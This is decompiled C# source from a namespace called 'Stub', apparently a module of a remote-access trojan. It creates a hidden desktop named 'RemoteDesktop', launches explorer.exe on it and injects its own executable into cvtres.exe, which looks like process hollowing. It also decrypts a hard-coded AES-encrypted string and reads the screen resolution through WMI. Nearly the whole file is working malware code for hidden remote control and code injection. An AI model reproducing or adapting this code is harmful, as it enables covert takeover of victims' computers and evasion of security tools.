using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x02000029 RID: 41
	[StandardModule]
	public sealed class Class4
	{
		// Token: 0x0600006D RID: 109
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern IntPtr CreateDesktopW(string String_0, IntPtr intptr_1, IntPtr intptr_2, uint uint_12, uint uint_13, Class4.Struct2 struct2_1);

		// Token: 0x0600006E RID: 110 RVA: 0x00004D50 File Offset: 0x00002F50
		public static void smethod_0()
		{
			try
			{
				Thread.Sleep(500);
				Class4.struct2_0.int_1 = -1;
				Thread.Sleep(500);
				Class4.struct2_0.intptr_0 = (IntPtr)0L;
				Thread.Sleep(500);
				Class4.intptr_0 = Class4.CreateDesktopW("RemoteDesktop", (IntPtr)0L, (IntPtr)0L, 1U, 511U, Class4.struct2_0);
				Thread.Sleep(500);
				Class9.Struct3 @struct = default(Class9.Struct3);
				Thread.Sleep(500);
				Class9.Struct4 struct2 = default(Class9.Struct4);
				Thread.Sleep(500);
				struct2.int_0 = Marshal.SizeOf(typeof(Class9.Struct4));
				Thread.Sleep(500);
				struct2.String_1 = "RemoteDesktop";
				Thread.Sleep(500);
				IntPtr intPtr = 0;
				Thread.Sleep(500);
				Class9.delegate9_0(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "Windows\\explorer.exe", null, intPtr, intPtr, false, 0U, IntPtr.Zero, null, ref struct2, ref @struct);
				Thread.Sleep(500);
				Class4.int_0 = (int)@struct.uint_0;
				Thread.Sleep(500);
				Class4.byte_0 = File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
				Thread.Sleep(500);
				Class9.smethod_2("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe", null, Class4.byte_0, true, true, "RemoteDesktop", Class4.int_0);
				Thread.Sleep(500);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00004EEC File Offset: 0x000030EC
		public static Size smethod_1()
		{
			Size size = default(Size);
			Size result;
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						size = new Size(Conversions.ToInteger(managementObject["CurrentHorizontalResolution"]), Conversions.ToInteger(managementObject["CurrentVerticalResolution"]));
					}
				}
				if (size.Width < 10 | size.Height < 10)
				{
					throw new Exception();
				}
				result = size;
			}
			catch (Exception ex)
			{
				try
				{
					size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				}
				catch (Exception ex2)
				{
				}
				result = size;
			}
			return result;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00002196 File Offset: 0x00000396
		public static string smethod_2()
		{
			return Class4.smethod_3("a14ca5898a4e4133bbce2ea2315a1915", "7tRRRxRnTmyvTZ1vAXsXxC4ABxxXbieuSOU+InZrlZM=");
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00004FF8 File Offset: 0x000031F8
		public static string smethod_3(string String_0, string String_1)
		{
			byte[] iv = new byte[16];
			byte[] buffer = Convert.FromBase64String(String_1);
			string result;
			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(String_0);
				aes.IV = iv;
				ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd();
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000072 RID: 114 RVA: 0x000050D0 File Offset: 0x000032D0
		public static void smethod_4()
		{
			try
			{
				Process.GetProcessById(Class4.int_0).Kill();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0400002B RID: 43
		public static byte[] byte_0;

		// Token: 0x0400002C RID: 44
		public const uint uint_0 = 32U;

		// Token: 0x0400002D RID: 45
		public const uint uint_1 = 32U;

		// Token: 0x0400002E RID: 46
		public const uint uint_2 = 1U;

		// Token: 0x0400002F RID: 47
		public const uint uint_3 = 4U;

		// Token: 0x04000030 RID: 48
		public const uint uint_4 = 2U;

		// Token: 0x04000031 RID: 49
		public const uint uint_5 = 64U;

		// Token: 0x04000032 RID: 50
		public const uint uint_6 = 8U;

		// Token: 0x04000033 RID: 51
		public const uint uint_7 = 32U;

		// Token: 0x04000034 RID: 52
		public const uint uint_8 = 16U;

		// Token: 0x04000035 RID: 53
		public const uint uint_9 = 1U;

		// Token: 0x04000036 RID: 54
		public const uint uint_10 = 256U;

		// Token: 0x04000037 RID: 55
		public const uint uint_11 = 128U;

		// Token: 0x04000038 RID: 56
		public static IntPtr intptr_0;

		// Token: 0x04000039 RID: 57
		public static Class4.Struct2 struct2_0;

		// Token: 0x0400003A RID: 58
		public static int int_0;

		// Token: 0x0200002A RID: 42
		public struct Struct2
		{
			// Token: 0x0400003B RID: 59
			public int int_0;

			// Token: 0x0400003C RID: 60
			public IntPtr intptr_0;

			// Token: 0x0400003D RID: 61
			public int int_1;
		}
	}
}
